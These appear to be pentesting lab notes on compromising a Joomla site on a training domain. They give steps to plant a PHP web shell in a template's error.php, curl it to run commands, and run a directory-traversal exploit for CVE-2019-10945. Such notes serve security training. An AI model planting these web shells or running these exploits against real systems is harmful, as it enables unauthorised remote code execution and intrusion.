## Abusing Built-In Functionality

1. Visit http://app.inlanefreight.local/administrator
2. Login with credentials
3. Configuration > Templates
4. Select template name (protostart)

**Note
If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.

5. Create PHP one-liner to gain RCE in error.php
```
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
- Best practice is to password protect, delete shell when done, and even restrict shell down to one IP

6. Click Save & Close and then curl for webshell
```
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```


## Leveraging Known Vulnerabilities

**CVE-2019-10945
https://www.exploit-db.com/exploits/46710
https://github.com/dpgg101/CVE-2019-10945
```
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```
